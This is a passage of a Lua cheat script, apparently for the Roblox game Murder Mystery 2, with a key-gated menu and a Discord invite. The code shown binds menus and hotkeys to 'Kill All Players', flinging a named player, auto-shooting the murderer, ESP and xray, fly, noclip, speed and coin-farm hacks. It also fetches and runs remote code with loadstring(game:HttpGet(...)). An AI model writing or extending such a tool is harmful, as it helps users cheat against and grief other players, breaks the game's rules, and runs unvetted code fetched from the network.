    Tabs.Combat:AddSection("Fling")
    local TargetInput = Tabs.Combat:AddInput("TargetPlayerInput", {
        Title = "Target Player Name",
        Default = "",
        Placeholder = "Enter Display or Username...",
        Callback = function(Value) Settings.FlingTarget = Value end
    })

    Tabs.Combat:AddButton({
        Title = "Fling",
        Callback = function() ExecuteFlingPlayer(Settings.FlingTarget) end
    })

    -- VISUALS TAB
    Tabs.Visuals:AddSection("Visual Features")
    local PlayerEspToggle = Tabs.Visuals:AddToggle("PlayerESP", {Title = "Player ESP", Default = false})
    PlayerEspToggle:OnChanged(function(Value)
        Settings.PlayerESP = Value
        Fluent:Notify({ Title = "Player ESP", Content = Value and "Player ESP Enabled" or "Player ESP Disabled", Duration = 2 })
        for _, player in ipairs(Players:GetPlayers()) do
            if Value then ApplyPlayerESP(player) else ClearPlayerESP(player) end
        end
    end)

    local GunEspToggle = Tabs.Visuals:AddToggle("GunESP", {Title = "Gun ESP", Default = false})
    GunEspToggle:OnChanged(function(Value) 
        Settings.GunESP = Value 
        Fluent:Notify({ Title = "Gun ESP", Content = Value and "Gun ESP Enabled" or "Gun ESP Disabled", Duration = 2 })
    end)

    local XrayToggle = Tabs.Visuals:AddToggle("XRayToggle", {Title = "XRay", Default = false})
    XrayToggle:OnChanged(function(Value) 
        ToggleXray(Value) 
        Fluent:Notify({ Title = "XRay", Content = Value and "XRay Enabled" or "XRay Disabled", Duration = 2 })
    end)

    -- MISC TAB
    Tabs.Misc:AddSection("Movement")

    local SpeedToggle = Tabs.Misc:AddToggle("SpeedToggle", {Title = "WalkSpeed", Default = false})
    SpeedToggle:OnChanged(function(Value) 
        Settings.SpeedToggle = Value 
        Fluent:Notify({ Title = "WalkSpeed", Content = Value and "WalkSpeed Enabled" or "WalkSpeed Disabled", Duration = 2 })
    end)

    Tabs.Misc:AddSlider("WalkSpeedSlider", {
        Title = "WalkSpeed Value",
        Default = 24,
        Min = 16,
        Max = 120,
        Rounding = 0,
        Callback = function(Value) Settings.WalkSpeed = Value end
    })

    local FlyToggleUI = Tabs.Misc:AddToggle("FlyToggleUI", {
        Title = "Fly",
        Default = false
    })
    FlyToggleUI:OnChanged(function(Value) 
        ToggleFly(Value) 
        Fluent:Notify({ Title = "Fly", Content = Value and "Fly Enabled" or "Fly Disabled", Duration = 2 })
    end)

    Tabs.Misc:AddSlider("FlySpeedSlider", {
        Title = "Fly Speed",
        Default = 50,
        Min = 10,
        Max = 150,
        Rounding = 0,
        Callback = function(Value) Settings.FlySpeed = Value end
    })

    local NoclipToggleUI = Tabs.Misc:AddToggle("NoclipToggleUI", {Title = "Noclip", Default = false})
    NoclipToggleUI:OnChanged(function(Value) 
        Settings.Noclip = Value 
        Fluent:Notify({ Title = "Noclip", Content = Value and "Noclip Enabled" or "Noclip Disabled", Duration = 2 })
    end)

    Tabs.Misc:AddSection("Utilities")
    local TPToGunToggle = Tabs.Misc:AddToggle("TPToGunToggle", {Title = "Auto TP to Dropped Gun", Default = false})
    TPToGunToggle:OnChanged(function(Value)
        Settings.TPToGun = Value
        Fluent:Notify({ Title = "Auto TP Gun", Content = Value and "Auto TP to Gun Enabled" or "Auto TP to Gun Disabled", Duration = 2 })
        if Value then ProcessTPToGun() end
    end)

    Tabs.Misc:AddButton({
        Title = "TP to Gun",
        Description = "TPs to dropped gun and returns back",
        Callback = function() TeleportToGun() end
    })

    Tabs.Misc:AddButton({
        Title = "Server Rejoin",
        Description = "Rejoins current server",
        Callback = function() ServerRejoin() end
    })

    Tabs.Misc:AddButton({
        Title = "Server Hop",
        Description = "Teleports to a different server",
        Callback = function() ServerHop() end
    })

    ----------------------------------------------------
    -- KEYBIND MANAGER ENGINE
    ----------------------------------------------------
    Tabs.Keybinds:AddSection("Click any box below to set or edit its Keybind")

    local BoundKeys = {
        Fly = Enum.KeyCode.F,
        Noclip = Enum.KeyCode.N,
        Farm = Enum.KeyCode.C,
        Shoot = Enum.KeyCode.E,
        KillAll = Enum.KeyCode.K,
        TPGun = Enum.KeyCode.G,
        Fling = Enum.KeyCode.X,
        Rejoin = Enum.KeyCode.R,
        Hop = Enum.KeyCode.H
    }

    local function ParseToKeyCode(input)
        if typeof(input) == "EnumItem" then
            return input
        elseif typeof(input) == "string" then
            local success, result = pcall(function() return Enum.KeyCode[input] end)
            if success and result then return result end
        end
        return nil
    end

    local function CreateKeybindController(title, keyKey)
        local bind = Tabs.Keybinds:AddKeybind(keyKey .. "Keybind", {
            Title = title,
            Mode = "Toggle",
            Default = BoundKeys[keyKey].Name
        })

        bind:OnChanged(function(NewKey)
            local parsed = ParseToKeyCode(NewKey) or ParseToKeyCode(bind.Value)
            if parsed then
                BoundKeys[keyKey] = parsed
                Fluent:Notify({ Title = "Keybind Set", Content = title .. " set to [" .. parsed.Name .. "]", Duration = 2 })
            end
        end)
    end

    CreateKeybindController("Fly", "Fly")
    CreateKeybindController("Noclip", "Noclip")
    CreateKeybindController("Coin Farm", "Farm")
    CreateKeybindController("Shoot Murderer", "Shoot")
    CreateKeybindController("Kill All Players", "KillAll")
    CreateKeybindController("TP To Gun", "TPGun")
    CreateKeybindController("Fling", "Fling")
    CreateKeybindController("Server Rejoin", "Rejoin")
    CreateKeybindController("Server Hop", "Hop")

    UserInputService.InputBegan:Connect(function(input, gpe)
        if gpe then return end
        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end

        local kc = input.KeyCode
        if kc == BoundKeys.Fly then
            Settings.Fly = not Settings.Fly
            FlyToggleUI:SetValue(Settings.Fly)
            ToggleFly(Settings.Fly)
            Fluent:Notify({ Title = "Fly (Keybind)", Content = Settings.Fly and "Fly Enabled" or "Fly Disabled", Duration = 2 })
        elseif kc == BoundKeys.Noclip then
            Settings.Noclip = not Settings.Noclip
            NoclipToggleUI:SetValue(Settings.Noclip)
            Fluent:Notify({ Title = "Noclip (Keybind)", Content = Settings.Noclip and "Noclip Enabled" or "Noclip Disabled", Duration = 2 })
        elseif kc == BoundKeys.Farm then
            Settings.CoinFarm = not Settings.CoinFarm
            FarmCoinsToggle:SetValue(Settings.CoinFarm)
            Fluent:Notify({ Title = "Coin Farm (Keybind)", Content = Settings.CoinFarm and "Coin Farm Enabled" or "Coin Farm Disabled", Duration = 2 })
            if Settings.CoinFarm then ProcessCoinFarm() end
        elseif kc == BoundKeys.Shoot then
            FireGunAtMurderer(true)
        elseif kc == BoundKeys.KillAll then
            ExecuteKillAll()
        elseif kc == BoundKeys.TPGun then
            TeleportToGun()
        elseif kc == BoundKeys.Fling then
            ExecuteFlingPlayer(Settings.FlingTarget)
        elseif kc == BoundKeys.Rejoin then
            ServerRejoin()
        elseif kc == BoundKeys.Hop then
            ServerHop()
        end
    end)

    ----------------------------------------------------
    -- PROFILE / INFO TAB
    ----------------------------------------------------
    Tabs.Info:AddSection("Account")
    Tabs.Info:AddParagraph({ Title = "Username", Content = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")" })
    Tabs.Info:AddParagraph({ Title = "User ID", Content = tostring(LocalPlayer.UserId) })

    Tabs.Info:AddSection("Session")
    local PlaytimeParagraph = Tabs.Info:AddParagraph({ Title = "Playtime Tracker", Content = "00h 00m 00s" })
    local CoinsGatheredParagraph = Tabs.Info:AddParagraph({ Title = "Coins Gathered", Content = "0" })
    local execName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Mobile / Universal Executor"
    Tabs.Info:AddParagraph({ Title = "Executor", Content = execName })

    Tabs.Info:AddSection("Discord")
    Tabs.Info:AddButton({
        Title = "Join Discord",
        Description = "Copies server invite link to clipboard",
        Callback = function()
            local link = "https://discord.gg/yJnFyDR5Ns"
            if setclipboard then
                setclipboard(link)
                Fluent:Notify({ Title = "Discord", Content = "Copied invite link to clipboard!", Duration = 3 })
            elseif toclipboard then
                toclipboard(link)
                Fluent:Notify({ Title = "Discord", Content = "Copied invite link to clipboard!", Duration = 3 })
            else
                Fluent:Notify({ Title = "Discord", Content = "Clipboard not supported by executor.", Duration = 3 })
            end
        end
    })

    ----------------------------------------------------
    -- TICKER & VISUALS RENDER ENGINE
    ----------------------------------------------------
    RunService.Heartbeat:Connect(function()
        pcall(function()
            PlaytimeParagraph:SetDesc(GetPlaytimeString())
            CoinsGatheredParagraph:SetDesc(tostring(CoinsCollectedSession))

            local char = LocalPlayer.Character
            if char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum and Settings.SpeedToggle then
                    hum.WalkSpeed = Settings.WalkSpeed
                end
            end

            if Settings.PlayerESP then
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer then
                        ApplyPlayerESP(player)
                    end
                end
            end

            local droppedGun = GetDroppedGun()
            if droppedGun then
                local gunHighlight = droppedGun:FindFirstChild("MM2_GunCham")
                if Settings.GunESP then
                    if not gunHighlight then
                        gunHighlight = Instance.new("Highlight")
                        gunHighlight.Name = "MM2_GunCham"
                        gunHighlight.Adornee = droppedGun
                        gunHighlight.FillColor = Color3.fromRGB(255, 215, 0)
                        gunHighlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                        gunHighlight.FillTransparency = 0.25
                        gunHighlight.OutlineTransparency = 0
                        gunHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        gunHighlight.Parent = droppedGun
                    end
                    gunHighlight.Enabled = true
                else
                    if gunHighlight then gunHighlight.Enabled = false end
                end
            end
        end)
    end)

    for _, p in ipairs(Players:GetPlayers()) do
        p.CharacterAdded:Connect(function()
            task.wait(0.5)
            if Settings.PlayerESP then ApplyPlayerESP(p) end
        end)
    end

    Players.PlayerAdded:Connect(function(p)
        p.CharacterAdded:Connect(function()
            task.wait(0.5)
            if Settings.PlayerESP then ApplyPlayerESP(p) end
        end)
    end)
end

----------------------------------------------------
-- KEY CHECK & LAUNCH CONTROL
----------------------------------------------------
local savedKey = LoadSavedKey()

if savedKey == CORRECT_KEY then
    StartMainScript()
else
    local Venyx = loadstring(game:HttpGet("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua"))()
    local UI = Venyx.new("Key System", 501310957)
    local EnteredKey = ""

    local MainTab = UI:addPage("Authentication", 501310957)
    local Section = MainTab:addSection("Verification")

    Section:addTextbox("Enter Key", "Paste key here", function(value)
        EnteredKey = value:gsub("%s+", "")
    end)

    Section:addButton("Verify Key", function()
        if EnteredKey == CORRECT_KEY then
            SaveKey(EnteredKey)
            UI:Notify("Success", "access granted! saving key & loading script...")
            task.wait(1)

            pcall(function()
                if game:GetService("CoreGui"):FindFirstChild("Key System") then
                    game:GetService("CoreGui")["Key System"]:Destroy()
                end
            end)

            StartMainScript()
        else
            UI:Notify("Error", "Invalid key")
        end
    end)

    Section:addButton("Copy Key Link", function()
        if setclipboard then
            setclipboard(KEY_LINK)
            UI:Notify("Copied", "Key link copied to clipboard!")
        elseif toclipboard then
            toclipboard(KEY_LINK)
            UI:Notify("Copied", "Key link copied to clipboard!")
        else
            UI:Notify("Error", "setclipboard is not supported")
        end
    end)

    UI:SelectPage(MainTab, true)
end
